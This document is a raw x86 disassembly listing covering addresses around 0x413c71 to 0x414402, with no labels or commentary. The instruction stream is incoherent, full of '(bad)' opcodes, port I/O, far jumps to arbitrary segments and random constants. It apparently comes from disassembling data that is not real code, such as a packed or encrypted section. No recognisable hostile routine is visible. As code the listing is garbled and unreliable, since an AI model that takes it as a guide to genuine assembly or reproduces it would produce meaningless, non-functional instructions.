  413c71:	mov    esp,0xdf0ee68e
  413c76:	sub    al,0x35
  413c78:	test   al,0x5a
  413c7a:	cwde   
  413c7b:	xor    al,dl
  413c7d:	or     bh,ch
  413c7f:	gs inc edi
  413c81:	in     al,dx
  413c82:	inc    ebx
  413c83:	adc    al,0xd8
  413c85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c86:	ffreep st(7)
  413c88:	cs xchg ebx,eax
  413c8a:	mov    ebp,0x4b22107c
  413c8f:	ret    0x19e6
  413c92:	aaa    
  413c93:	out    dx,al
  413c94:	jle    0x413c79
  413c96:	ins    BYTE PTR es:[edi],dx
  413c97:	adc    DWORD PTR [esp+ecx*8],esp
  413c9a:	retf   
  413c9b:	enter  0x730f,0xed
  413c9f:	xor    bh,0x3
  413ca2:	mov    ecx,0x84ede9b7
  413ca7:	pop    ds
  413ca8:	push   0xffffffb7
  413caa:	jno    0x413c54
  413cac:	dec    esp
  413cad:	xor    al,0xf5
  413caf:	(bad)  
  413cb0:	cmc    
  413cb1:	data16 lahf 
  413cb3:	adc    esp,edi
  413cb5:	call   0x7e10:0xd0eb775d
  413cbc:	and    eax,0x9c22ba82
  413cc1:	fmul   QWORD PTR [ebx]
  413cc3:	cwde   
  413cc4:	hlt    
  413cc5:	push   es
  413cc6:	xchg   al,ah
  413cc8:	or     al,0x6f
  413cca:	dec    ebx
  413ccb:	repnz sub ebp,eax
  413cce:	cwde   
  413ccf:	jge    0x413cf0
  413cd1:	fisttp WORD PTR [esi+0x51]
  413cd4:	into   
  413cd5:	nop
  413cd6:	leave  
  413cd7:	or     eax,0xbdfcec41
  413cdc:	xchg   edi,eax
  413cdd:	out    0xfd,eax
  413cdf:	mov    ch,0x61
  413ce1:	jo     0x413d51
  413ce3:	lahf   
  413ce4:	cwde   
  413ce5:	fisttp WORD PTR [ebx]
  413ce7:	jnp    0x413d09
  413ce9:	ret    
  413cea:	or     DWORD PTR [ebx+0x5cfd84dd],esi
  413cf0:	xchg   ebx,eax
  413cf1:	call   0xc7e4:0x756b9638
  413cf8:	sbb    eax,0x1168dded
  413cfd:	shr    dl,cl
  413cff:	jae    0x413ced
  413d01:	add    esp,DWORD PTR [edx+0x455e489d]
  413d07:	shl    DWORD PTR [ebx],cl
  413d09:	xchg   ebx,eax
  413d0a:	sbb    al,0xc8
  413d0c:	cmp    BYTE PTR [edx],dl
  413d0e:	sub    DWORD PTR [edi+0x3120675d],0xffffffeb
  413d15:	sub    BYTE PTR [edi],dl
  413d17:	out    0xd9,eax
  413d19:	inc    ebp
  413d1a:	adc    eax,0x7fc51782
  413d1f:	mov    al,ds:0x9b7ee100
  413d24:	into   
  413d25:	dec    ecx
  413d26:	add    ecx,eax
  413d28:	jmp    0xd440ddc
  413d2d:	jecxz  0x413d2b
  413d2f:	xchg   esp,eax
  413d30:	shl    DWORD PTR [esi-0x73c74c77],1
  413d36:	jns    0x413d00
  413d38:	mov    ds:0x7159a59b,eax
  413d3d:	into   
  413d3e:	rcl    DWORD PTR [edi],1
  413d40:	std    
  413d41:	cmp    ebx,DWORD PTR [edi]
  413d43:	ds je  0x413d93
  413d46:	pusha  
  413d47:	dec    eax
  413d48:	jecxz  0x413da5
  413d4a:	sbb    ebx,DWORD PTR [ebx]
  413d4c:	popf   
  413d4d:	jmp    0x413d32
  413d4f:	xor    dh,BYTE PTR [edi+0x5f]
  413d52:	test   BYTE PTR [edi],dl
  413d54:	ss add eax,0xa7970217
  413d5a:	cld    
  413d5b:	inc    edx
  413d5c:	cs inc ecx
  413d5e:	or     eax,0xd60cecb6
  413d63:	mov    al,ds:0x21c9dfd2
  413d68:	sub    esi,eax
  413d6a:	dec    esp
  413d6b:	in     al,0x50
  413d6d:	and    edi,ebp
  413d6f:	pop    edi
  413d70:	add    DWORD PTR [edi-0x2e6852c6],esp
  413d76:	adc    cl,cl
  413d78:	data16 cli 
  413d7a:	lock mov bh,0x3f
  413d7d:	je     0x413da9
  413d7f:	sbb    al,0xf0
  413d81:	mov    esi,0xff6183f3
  413d86:	outs   dx,BYTE PTR ds:[esi]
  413d87:	dec    edi
  413d88:	adc    bh,bh
  413d8a:	retf   0xc60a
  413d8d:	or     al,0x1a
  413d8f:	iret   
  413d90:	mov    al,0x25
  413d92:	out    dx,al
  413d93:	shr    DWORD PTR [ebx-0x7c29755c],0xad
  413d9a:	cld    
  413d9b:	idiv   DWORD PTR [ecx]
  413d9d:	mov    ds:0x5e041eaf,eax
  413da2:	aaa    
  413da3:	popf   
  413da4:	cmp    bl,bh
  413da6:	out    0xac,eax
  413da8:	xchg   esi,eax
  413da9:	push   esp
  413daa:	pushf  
  413dab:	stos   BYTE PTR es:[edi],al
  413dac:	inc    esp
  413dad:	add    esi,DWORD PTR gs:[ecx]
  413db0:	hlt    
  413db1:	jmp    0x3ebfa1e8
  413db6:	push   edi
  413db7:	mov    ds:0x4db5093d,eax
  413dbc:	inc    eax
  413dbd:	(bad)  
  413dbf:	dec    eax
  413dc0:	mov    ds:0x57f8a4b1,eax
  413dc5:	pop    eax
  413dc6:	lahf   
  413dc7:	aad    0xe7
  413dc9:	dec    ecx
  413dca:	cmp    BYTE PTR [eax-0x18],ch
  413dcd:	push   esi
  413dce:	mov    ebp,0x9d39dedc
  413dd3:	enter  0xb231,0x89
  413dd7:	xor    edi,DWORD PTR [esi]
  413dd9:	imul   eax,DWORD PTR [edx],0xffffff9f
  413ddc:	jmp    0x413e21
  413dde:	(bad)  
  413ddf:	dec    ebp
  413de0:	push   ds
  413de1:	cli    
  413de2:	xor    DWORD PTR [ebx-0x6ac0208a],ebx
  413de8:	xor    bh,BYTE PTR [eax]
  413dea:	mov    edi,0xfcc9f5bf
  413def:	push   esp
  413df0:	iret   
  413df1:	scas   eax,DWORD PTR es:[edi]
  413df2:	daa    
  413df3:	or     eax,esp
  413df5:	retf   0xc8c1
  413df8:	in     al,0x28
  413dfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413dfb:	dec    edx
  413dfc:	adc    dl,BYTE PTR [ebx-0x1ae22740]
  413e02:	cld    
  413e03:	cmp    al,0x6d
  413e05:	call   0xd365:0x7008fc49
  413e0c:	enter  0x7778,0x95
  413e10:	mov    ds:0xe5b8008b,eax
  413e15:	or     DWORD PTR [ecx],esp
  413e17:	inc    ecx
  413e18:	shl    BYTE PTR [edi+0x58],1
  413e1b:	add    eax,0x3ad8dfcc
  413e20:	inc    edx
  413e21:	cmp    esp,ebp
  413e23:	cdq    
  413e24:	add    bp,di
  413e27:	push   ss
  413e28:	and    ch,bh
  413e2a:	aad    0x5f
  413e2c:	cmp    eax,eax
  413e2e:	push   esp
  413e2f:	in     al,dx
  413e30:	mov    bh,0xa4
  413e32:	fs call 0x32711dad
  413e38:	mov    cl,0x7e
  413e3a:	pop    ecx
  413e3b:	jmp    0xfe62:0x7bffe773
  413e42:	gs movmskps ebx,xmm4
  413e46:	mov    al,0xc9
  413e48:	xor    DWORD PTR [esi],esi
  413e4a:	orps   xmm6,XMMWORD PTR [ebx]
  413e4d:	push   0x557b842d
  413e52:	std    
  413e53:	push   edx
  413e54:	dec    esi
  413e55:	xchg   ebx,eax
  413e56:	test   DWORD PTR [esi],ecx
  413e58:	shr    BYTE PTR [eax+eiz*1-0x37],1
  413e5c:	stc    
  413e5d:	aaa    
  413e5e:	mov    ds:0xd03346e8,eax
  413e63:	sub    al,0x4
  413e65:	pop    edx
  413e66:	and    eax,0x5894eb08
  413e6b:	sbb    al,0x3f
  413e6d:	stos   BYTE PTR es:[edi],al
  413e6e:	dec    ebx
  413e6f:	mov    dl,BYTE PTR [edi+ebx*8]
  413e72:	mov    eax,ds:0xba7eeff0
  413e77:	sub    BYTE PTR [edx-0x38],al
  413e7a:	cld    
  413e7b:	inc    esi
  413e7c:	scas   al,BYTE PTR es:[edi]
  413e7d:	je     0x413e29
  413e7f:	jne    0x413e56
  413e81:	jmp    0x413e2a
  413e83:	enter  0xb391,0x66
  413e87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e88:	xor    dh,BYTE PTR [ebx+ebx*4]
  413e8b:	sub    ebx,0x42
  413e8e:	sbb    BYTE PTR [ebp-0xf],bh
  413e91:	les    ecx,FWORD PTR [eax-0x53207900]
  413e97:	popf   
  413e98:	jnp    0x413ea6
  413e9a:	push   ds
  413e9b:	or     BYTE PTR [esi+0x50c3fd58],bh
  413ea1:	jne    0x413ea3
  413ea3:	fnstcw WORD PTR ds:0xf7c7d376
  413ea9:	adc    eax,0x7238e05e
  413eae:	xchg   ebx,eax
  413eaf:	lods   al,BYTE PTR ds:[esi]
  413eb0:	add    dh,dh
  413eb2:	sbb    al,0xbb
  413eb4:	stos   DWORD PTR es:[edi],eax
  413eb5:	addr16 inc ebx
  413eb7:	fyl2xp1 
  413eb9:	repnz outs dx,DWORD PTR ds:[esi]
  413ebb:	retf   
  413ebc:	or     al,0xcd
  413ebe:	dec    ebx
  413ebf:	pop    edx
  413ec0:	mov    gs,WORD PTR [ebp-0x53]
  413ec3:	repz retf 
  413ec5:	mov    al,ds:0xe1cb1fc
  413eca:	push   edx
  413ecb:	ret    
  413ecc:	jmp    0x8009545c
  413ed1:	inc    esi
  413ed2:	test   BYTE PTR [ebx+0x221c8d2f],al
  413ed8:	in     al,dx
  413ed9:	leave  
  413eda:	aaa    
  413edb:	aaa    
  413edc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413edd:	add    al,0x87
  413edf:	push   0xffffffcb
  413ee1:	or     BYTE PTR [eax+ecx*8-0x23],ch
  413ee5:	aaa    
  413ee6:	fs jle 0x413e8a
  413ee9:	in     eax,0xb0
  413eeb:	(bad)  
  413eec:	jmp    0x413f4b
  413eee:	push   cs
  413eef:	ins    DWORD PTR es:[edi],dx
  413ef0:	adc    eax,0x7be33a5e
  413ef5:	fucomip st,st(2)
  413ef7:	sbb    edi,edi
  413ef9:	jl     0x413f6d
  413efb:	stos   DWORD PTR es:[edi],eax
  413efc:	adc    DWORD PTR [esi-0x47b04004],0xcd46c677
  413f06:	daa    
  413f07:	enter  0xad62,0xc7
  413f0b:	mov    eax,ds:0x894053e8
  413f10:	jmp    0x413f1c
  413f12:	into   
  413f13:	jecxz  0x413f7a
  413f15:	call   0x6e2a:0xdf7752bc
  413f1c:	in     al,0xfd
  413f1e:	add    eax,DWORD PTR [ecx]
  413f20:	push   cs
  413f21:	jmp    0x413f0a
  413f23:	sub    al,0xbb
  413f25:	fbld   TBYTE PTR [edx]
  413f27:	hlt    
  413f28:	jns    0x413f58
  413f2a:	in     al,0x33
  413f2c:	test   eax,0xe4b92de0
  413f31:	adc    BYTE PTR [esi+0x27],dh
  413f34:	das    
  413f35:	iret   
  413f36:	sbb    DWORD PTR [edx],0xbdfcfe90
  413f3c:	jns    0x413eec
  413f3e:	out    0xb4,eax
  413f40:	dec    ecx
  413f41:	xlat   BYTE PTR ds:[ebx]
  413f43:	(bad)  
  413f44:	pop    ecx
  413f45:	xor    bh,dh
  413f47:	sahf   
  413f48:	pop    ss
  413f49:	jmp    0x413f17
  413f4b:	inc    ecx
  413f4c:	jmp    0x413f91
  413f4e:	jge    0x413ef3
  413f50:	loopne 0x413fb7
  413f52:	cmp    DWORD PTR [edx-0x4c9c2035],ebx
  413f58:	jecxz  0x413f5a
  413f5a:	div    BYTE PTR [ebp-0x22034776]
  413f60:	xlat   BYTE PTR ds:[ebx]
  413f61:	imul   ebx,DWORD PTR [edx-0x32],0xffffffcd
  413f65:	shr    ecx,cl
  413f67:	into   
  413f68:	cmp    BYTE PTR cs:[edi],0x8c
  413f6c:	mov    ebx,DWORD PTR ds:0xb4cb3103
  413f72:	sti    
  413f73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f75:	addr16 ret 0x9ba3
  413f79:	cmc    
  413f7a:	mov    eax,0xd7ed6a13
  413f7f:	dec    ebx
  413f80:	adc    bl,bh
  413f82:	inc    ebp
  413f83:	movaps xmm1,XMMWORD PTR [ebx-0x73632666]
  413f8a:	call   0x9720957b
  413f8f:	(bad)  
  413f90:	int    0xbf
  413f92:	outs   dx,BYTE PTR ds:[esi]
  413f93:	add    DWORD PTR [edx-0x21],esp
  413f96:	xchg   ebp,eax
  413f97:	adc    cl,dh
  413f99:	loopne 0x413f3c
  413f9b:	push   edi
  413f9c:	jle    0x413fdc
  413f9e:	std    
  413f9f:	sbb    dh,ch
  413fa1:	pusha  
  413fa2:	fwait
  413fa3:	inc    eax
  413fa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fa5:	repz cmp ecx,eax
  413fa8:	push   ds
  413fa9:	mov    edi,0x1b4e0841
  413fae:	push   esi
  413faf:	lods   al,BYTE PTR ds:[esi]
  413fb0:	jmp    0x413f56
  413fb2:	ins    DWORD PTR es:[edi],dx
  413fb3:	mov    ecx,0x5f9a47fe
  413fb8:	mov    ecx,0x31f131df
  413fbd:	xchg   edi,eax
  413fbe:	or     BYTE PTR [eax+0x3cfd7e92],bh
  413fc4:	fwait
  413fc5:	mov    al,0x5c
  413fc7:	out    0x6d,al
  413fc9:	mov    ch,0x23
  413fcb:	retf   
  413fcc:	les    ebp,FWORD PTR [ebx-0x532bbacf]
  413fd2:	ins    BYTE PTR es:[edi],dx
  413fd3:	out    0xdd,eax
  413fd5:	stc    
  413fd6:	and    al,0xd2
  413fd8:	jmp    0x15d7:0xe9496f2b
  413fdf:	stc    
  413fe0:	or     bl,bh
  413fe2:	fdivr  QWORD PTR [ebx+0x2c]
  413fe5:	fild   QWORD PTR [edx+0x639fa755]
  413feb:	adc    BYTE PTR [ecx+0xc],dh
  413fee:	std    
  413fef:	nop
  413ff0:	das    
  413ff1:	xlat   BYTE PTR ds:[ebx]
  413ff2:	mov    dl,0x48
  413ff4:	es jne 0x413f97
  413ff7:	enter  0x6c07,0x4
  413ffb:	xor    eax,0x93dedce4
  414000:	loope  0x414034
  414002:	rol    DWORD PTR [edi+0x39],1
  414005:	(bad)  
  414006:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414007:	push   esp
  414008:	lods   eax,DWORD PTR ds:[esi]
  414009:	aas    
  41400a:	or     dl,BYTE PTR [eax+0x3ffcb754]
  414010:	daa    
  414011:	inc    edi
  414012:	pop    ss
  414013:	test   BYTE PTR [ebp+0x13],cl
  414016:	and    ch,dl
  414018:	cwde   
  414019:	cmp    ch,0x7f
  41401c:	jmp    0x9ce1776f
  414021:	es jmp 0x4aa3:0x812f6fc9
  414029:	fnstcw WORD PTR [ebx+0x4b]
  41402c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41402d:	mov    edi,0x8ffe9a46
  414032:	test   eax,0xf70eebde
  414037:	adc    DWORD PTR [edx],edi
  414039:	shr    DWORD PTR ds:0xc1206b15,0x5
  414040:	into   
  414041:	das    
  414042:	lods   al,BYTE PTR ds:[esi]
  414044:	std    
  414045:	repnz in eax,0x13
  414048:	pop    eax
  414049:	fdiv   QWORD PTR [esi]
  41404b:	dec    ebp
  41404c:	lock xor cl,BYTE PTR [ecx+0x2ac51bf8]
  414053:	enter  0xbf3b,0x38
  414057:	push   ecx
  414058:	fld    st(6)
  41405a:	bnd jmp esp
  41405d:	lahf   
  41405e:	cdq    
  41405f:	dec    eax
  414060:	fild   WORD PTR [eax]
  414062:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414063:	pop    es
  414064:	ja     0x41408f
  414066:	in     al,0xc7
  414068:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414069:	push   esp
  41406a:	push   ebx
  41406b:	and    ebp,esi
  41406d:	ret    0x4412
  414070:	jmp    0x41401e
  414072:	outs   dx,BYTE PTR ds:[esi]
  414073:	shl    DWORD PTR [ecx+0xef9f269],cl
  414079:	(bad)  
  41407b:	mov    al,ds:0xb4c6a038
  414080:	test   al,0x85
  414082:	add    BYTE PTR [ebp+0x77f074cb],cl
  414088:	into   
  414089:	pop    ebp
  41408a:	test   BYTE PTR [eax+0x33],cl
  41408d:	out    dx,al
  41408e:	stos   BYTE PTR es:[edi],al
  41408f:	hlt    
  414090:	dec    ebp
  414091:	fbstp  TBYTE PTR [eax]
  414093:	xchg   edi,eax
  414094:	pop    esi
  414095:	or     BYTE PTR [esi+0x71],dh
  414098:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414099:	mov    esi,0x62ebca9a
  41409e:	add    edx,DWORD PTR [esi+0x10]
  4140a1:	cwde   
  4140a2:	fidivr WORD PTR [eax-0x51c22397]
  4140a8:	push   ds
  4140a9:	sub    eax,DWORD PTR [edx+0x37c03363]
  4140af:	mov    edi,0xd74d64eb
  4140b4:	fdivr  st,st(1)
  4140b6:	loopne 0x414062
  4140b8:	lahf   
  4140b9:	fistp  WORD PTR [ebx+0x66]
  4140bc:	cld    
  4140bd:	cmp    cl,BYTE PTR [edi]
  4140bf:	or     eax,0x40fcd13c
  4140c4:	mov    edx,0xad2ed2a
  4140c9:	test   eax,esp
  4140cb:	(bad)  
  4140cc:	push   edx
  4140cd:	ins    BYTE PTR es:[edi],dx
  4140ce:	pusha  
  4140cf:	sbb    DWORD PTR [esi],esi
  4140d1:	xchg   esp,eax
  4140d2:	jle    0x414068
  4140d4:	jmp    0x41410a
  4140d6:	jbe    0x4140d1
  4140d8:	mov    ebp,ebx
  4140da:	test   eax,0xdb3d21ae
  4140df:	(bad)  
  4140e0:	pop    ds
  4140e1:	jl     0x41412c
  4140e3:	adc    esi,DWORD PTR [edx+0x1b098b33]
  4140e9:	clc    
  4140ea:	xor    BYTE PTR [edx+0x12],ah
  4140ed:	enter  0x3efc,0x78
  4140f1:	or     DWORD PTR [ecx-0x6b041d99],ebx
  4140f7:	in     al,0xe4
  4140f9:	fwait
  4140fa:	add    al,cl
  4140fc:	jnp    0x41411b
  4140fe:	and    al,0xe2
  414100:	mov    ds:0xa891e1f6,al
  414105:	fbstp  TBYTE PTR [ebp-0xe]
  414108:	and    dh,BYTE PTR [eax+0x39148c5f]
  41410e:	mov    dh,0xc8
  414110:	push   0xfe945093
  414115:	xlat   BYTE PTR ds:[ebx]
  414116:	and    bl,cl
  414118:	jmp    0x4140d7
  41411a:	fidiv  DWORD PTR [eax+0x0]
  41411d:	into   
  41411e:	mov    esi,0x21df3942
  414123:	mov    eax,0xc4bc824f
  414128:	lock mov esp,edi
  41412b:	add    DWORD PTR [edi],ebp
  41412d:	xor    eax,0xd22ac8ff
  414132:	fcom   DWORD PTR [edi]
  414134:	ins    DWORD PTR es:[edi],dx
  414135:	dec    edi
  414136:	or     eax,esp
  414138:	pop    eax
  414139:	sbb    cl,BYTE PTR [edx+0x5f]
  41413c:	test   DWORD PTR [eax-0x40],0xb6280386
  414143:	psadbw mm0,mm5
  414146:	push   edx
  414147:	enter  0x4428,0xa0
  41414b:	jno    0x41411b
  41414d:	adc    BYTE PTR [edi+0x3c],ch
  414150:	jmp    0x41410e
  414152:	and    eax,0x4b6192cc
  414157:	aad    0x46
  414159:	retf   0xc7d0
  41415c:	mov    al,ds:0x50fc5401
  414161:	jmp    0xd3ff231
  414166:	js     0x4141e3
  414168:	(bad)  
  414169:	push   ebp
  41416a:	call   0x5b54d1b6
  41416f:	les    ebx,FWORD PTR ds:0x13c54b86
  414175:	jo     0x4140f9
  414177:	mov    ah,0xea
  414179:	fbld   TBYTE PTR [ebp+0x5b]
  41417c:	mov    esi,0xeb5a2eb0
  414181:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414182:	pop    esp
  414183:	jmp    eax
  414185:	mov    DWORD PTR [ecx+eiz*1+0x69],ebx
  414189:	loopne 0x41419d
  41418b:	lds    eax,FWORD PTR [ecx+0x7d]
  41418e:	retf   0x71c8
  414191:	push   ds
  414192:	(bad)  [edx+0x6f2b4fe6]
  414198:	xchg   ecx,eax
  414199:	lds    edi,FWORD PTR [ebx+0x7a]
  41419c:	cmp    eax,0x5b508f7f
  4141a1:	or     dh,BYTE PTR [edi-0x38]
  4141a4:	push   eax
  4141a5:	adc    eax,0x96c19ef3
  4141aa:	xchg   ebx,eax
  4141ab:	cmp    bl,ch
  4141ad:	out    dx,eax
  4141ae:	inc    edi
  4141af:	pop    edi
  4141b0:	enter  0x7e21,0xc9
  4141b4:	repz fistp QWORD PTR [ebx-0x3f1fdb2b]
  4141bb:	xor    ch,al
  4141bd:	imul   edi,ebp,0x373ff7ce
  4141c3:	adc    edi,ebx
  4141c5:	int    0x2a
  4141c7:	enter  0x65f4,0xf1
  4141cb:	jne    0x41419e
  4141cd:	sub    dl,bh
  4141cf:	lock loope 0x41423a
  4141d2:	pop    edx
  4141d3:	popa   
  4141d4:	neg    BYTE PTR [edi-0x2c]
  4141d7:	jle    0x414248
  4141d9:	int3   
  4141da:	jg     0x41421d
  4141dc:	and    dh,bl
  4141de:	mov    ebx,0x143f3bfd
  4141e3:	xlat   BYTE PTR ds:[ebx]
  4141e4:	xor    edi,DWORD PTR [ebx]
  4141e6:	xor    ebp,edi
  4141e8:	jmp    0x41418c
  4141ea:	sbb    al,0xbe
  4141ec:	pop    ss
  4141ed:	mov    eax,ds:0x7defd50c
  4141f2:	mov    ecx,DWORD PTR [eax-0x37479845]
  4141f8:	sbb    BYTE PTR [ecx+edx*1+0x43],dh
  4141fc:	add    al,0x66
  4141fe:	test   BYTE PTR [ebx-0x69],dl
  414201:	dec    esi
  414202:	std    
  414203:	enter  0x3ee3,0x95
  414207:	mov    BYTE PTR [edx-0x23],bl
  41420a:	sbb    al,0xdd
  41420c:	adc    al,0xa0
  41420e:	std    
  41420f:	cld    
  414210:	xor    bl,BYTE PTR [edi]
  414212:	jge    0x4141be
  414214:	pop    ds
  414215:	aaa    
  414216:	sub    BYTE PTR [ebx],ah
  414218:	jecxz  0x414266
  41421a:	sbb    DWORD PTR [eax+0x5f],ecx
  41421d:	push   ebx
  41421e:	ins    DWORD PTR es:[edi],dx
  41421f:	lods   eax,DWORD PTR ds:[esi]
  414220:	sub    bh,BYTE PTR [edi]
  414222:	jno    0x4141ec
  414224:	fdivr  QWORD PTR [esi+eax*2]
  414227:	dec    edi
  414228:	add    BYTE PTR [eax],0x11
  41422b:	xor    eax,0x8263faeb
  414230:	out    0xb2,al
  414232:	inc    esp
  414233:	imul   ecx,DWORD PTR [esi-0x21],0xffffffa3
  414237:	cs and eax,esi
  41423a:	scas   eax,DWORD PTR es:[edi]
  41423b:	xchg   esi,eax
  41423c:	(bad)  
  41423e:	cld    
  41423f:	sahf   
  414240:	mov    dl,0x7e
  414242:	nop
  414243:	sbb    BYTE PTR [eax+0x2e],al
  414246:	cmp    cl,cl
  414248:	cmp    eax,0x22eddfa9
  41424d:	push   0xffffffd9
  41424f:	xlat   BYTE PTR ds:[ebx]
  414250:	ffreep st(5)
  414252:	in     al,0x4e
  414254:	dec    esi
  414255:	pop    esi
  414256:	mov    esp,DWORD PTR [edx]
  414258:	xlat   BYTE PTR ds:[ebx]
  414259:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41425a:	sbb    esp,ebp
  41425c:	fwait
  41425d:	jb     0x4142ac
  41425f:	enter  0x9b6,0x61
  414263:	in     al,dx
  414264:	add    BYTE PTR [ecx],ah
  414266:	xchg   esp,eax
  414267:	loop   0x414254
  414269:	popa   
  41426a:	mov    ch,0x35
  41426c:	out    0xc1,al
  41426e:	fs (bad) 
  414270:	lock fmul DWORD PTR [esi]
  414273:	or     BYTE PTR [ecx-0x6516e2f6],0x52
  41427a:	mov    esi,ecx
  41427c:	jmp    0x4142d6
  41427e:	push   esi
  41427f:	and    ch,cl
  414281:	hlt    
  414282:	out    dx,al
  414283:	cli    
  414284:	xchg   ecx,eax
  414285:	inc    ebp
  414286:	fs enter 0xe101,0x81
  41428b:	cmp    edx,DWORD PTR [esi]
  41428d:	imul   esi,DWORD PTR [ecx],0x9
  414290:	out    0xf0,al
  414292:	(bad)  
  414294:	rcr    DWORD PTR [edi+0x4f5c1eff],0x4f
  41429b:	(bad)  [edx-0x32abed21]
  4142a1:	icebp  
  4142a2:	sbb    dl,BYTE PTR [ecx+0x65]
  4142a5:	jbe    0x4142a4
  4142a7:	ja     0x4142e8
  4142a9:	iret   
  4142aa:	xor    ebp,ecx
  4142ac:	adc    al,0xc7
  4142ae:	jmp    0x41428c
  4142b0:	or     BYTE PTR [ebp-0xd],al
  4142b3:	jne    0x414251
  4142b5:	int3   
  4142b6:	sbb    al,0xb0
  4142b8:	ret    
  4142b9:	xor    ecx,DWORD PTR [edx-0x6b]
  4142bc:	out    0xf6,al
  4142be:	iret   
  4142bf:	retf   0x7a74
  4142c2:	popf   
  4142c3:	addr16 mov cl,0x42
  4142c6:	stos   BYTE PTR es:[edi],al
  4142c7:	enter  0x63fb,0x1c
  4142cb:	cli    
  4142cc:	leave  
  4142cd:	aaa    
  4142ce:	inc    ebx
  4142cf:	xor    ebp,ebx
  4142d1:	inc    eax
  4142d2:	popa   
  4142d3:	inc    ecx
  4142d4:	sbb    al,0x88
  4142d6:	inc    esp
  4142d7:	rol    ecx,0xdf
  4142da:	xor    al,0xc3
  4142dc:	fdiv   QWORD PTR [edi-0x20]
  4142df:	xchg   edx,eax
  4142e0:	inc    esi
  4142e1:	push   es
  4142e2:	std    
  4142e3:	mov    esi,0xa8855c7e
  4142e8:	mov    ds:0x4b0bc75e,ax
  4142ee:	je     0x414344
  4142f0:	mov    esi,0x98ffd89f
  4142f5:	cs std 
  4142f7:	mov    cs,WORD PTR [ebp+ecx*8-0x13c4f0ca]
  4142fe:	sub    al,0xca
  414300:	je     0x4142c3
  414302:	sti    
  414303:	pushf  
  414304:	and    ah,BYTE PTR [edi-0x1c4855e4]
  41430a:	stos   BYTE PTR es:[edi],al
  41430b:	mov    bl,ch
  41430d:	fs in  eax,dx
  41430f:	xchg   esi,eax
  414310:	(bad)  
  414311:	loop   0x414392
  414313:	pop    ebx
  414314:	and    al,0xdf
  414316:	cmc    
  414317:	sub    eax,DWORD PTR ds:[esi-0x4794126c]
  41431e:	sbb    eax,0x9e2f9fa4
  414323:	xchg   esp,eax
  414324:	inc    ebx
  414325:	aas    
  414326:	rcr    DWORD PTR [edx],0xec
  414329:	stc    
  41432a:	mov    ch,0x8a
  41432c:	pop    es
  41432d:	jecxz  0x414343
  41432f:	fadd   QWORD PTR [ecx+0x39a4f31f]
  414335:	mov    ds:0x38e99864,al
  41433a:	adc    BYTE PTR [ebx],ah
  41433c:	dec    ecx
  41433d:	xchg   edx,eax
  41433e:	outs   dx,DWORD PTR ds:[esi]
  41433f:	test   al,0xe4
  414341:	xchg   esi,eax
  414342:	xor    eax,ecx
  414344:	mov    ds:0x2950d5f4,eax
  414349:	je     0x41439f
  41434b:	(bad)  
  41434c:	jmp    0x4142d7
  41434e:	jmp    FWORD PTR [ecx+0x70]
  414351:	cmp    ecx,DWORD PTR [eax]
  414353:	mov    DWORD PTR [edi+ebx*8],ecx
  414356:	dec    eax
  414357:	call   DWORD PTR [edi+0x587892d1]
  41435d:	std    
  41435e:	cld    
  41435f:	pop    es
  414360:	and    ecx,DWORD PTR [ecx+0x3d]
  414363:	nop
  414364:	cld    
  414365:	pop    edx
  414366:	pop    ecx
  414367:	fwait
  414368:	scas   al,BYTE PTR es:[edi]
  414369:	fistp  WORD PTR [ebx+0x7add756a]
  41436f:	cmp    al,0x52
  414371:	jmp    0x41436f
  414373:	cmp    eax,0x5f9720fe
  414378:	xchg   esi,eax
  414379:	and    DWORD PTR [ebx+0x589b34c8],0x1425fccc
  414383:	jmp    0x81eb:0x5fe684f6
  41438a:	mov    dl,0x12
  41438c:	int3   
  41438d:	xchg   edi,eax
  41438e:	nop
  41438f:	(bad)  
  414390:	std    
  414391:	sub    DWORD PTR [esi],0xa93fa8dc
  414397:	jp     0x41433c
  414399:	push   0x9c2cdef4
  41439e:	xor    esp,DWORD PTR [edi]
  4143a0:	pop    ds
  4143a1:	dec    eax
  4143a2:	sbb    eax,0xfc2904b9
  4143a7:	fwait
  4143a8:	sub    edi,ebx
  4143aa:	in     al,dx
  4143ab:	cmp    DWORD PTR [eax+0xd],esi
  4143ae:	(bad)  
  4143af:	mov    cl,0xc8
  4143b1:	jae    0x4143b3
  4143b3:	jae    0x4143ac
  4143b5:	in     eax,dx
  4143b6:	jo     0x41437a
  4143b8:	adc    DWORD PTR [eax-0x13],esp
  4143bb:	inc    ebx
  4143bc:	aas    
  4143bd:	push   ss
  4143be:	rol    edi,cl
  4143c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143c1:	(bad)  
  4143c2:	lods   eax,DWORD PTR ds:[esi]
  4143c3:	mov    bh,0x8f
  4143c5:	xor    al,0x1d
  4143c7:	pop    edi
  4143c8:	jmp    0x414387
  4143ca:	(bad)  
  4143cb:	fidiv  DWORD PTR [ecx]
  4143cd:	mov    ch,0xe3
  4143cf:	push   esp
  4143d0:	xchg   edi,eax
  4143d1:	fild   QWORD PTR [ecx+eiz*2+0x320f4224]
  4143d8:	test   al,0x74
  4143da:	rdpmc  
  4143dc:	xchg   BYTE PTR ds:0xf0efa2fd,cl
  4143e2:	mov    bh,0x46
  4143e4:	dec    ecx
  4143e5:	fiadd  WORD PTR [ebp-0x66]
  4143e8:	and    ebp,DWORD PTR [ebx]
  4143ea:	shr    al,cl
  4143ec:	push   edx
  4143ed:	xor    eax,DWORD PTR [edx+0x76]
  4143f0:	jmp    0x414405
  4143f2:	xor    BYTE PTR [eax-0x7],0xac
  4143f6:	mov    edi,0x5fdf67b1
  4143fb:	nop
  4143fc:	lahf   
  4143fd:	mov    ds:0xc291caf,eax
  414402:	and    ebp,DWORD PTR [edi-0x15]
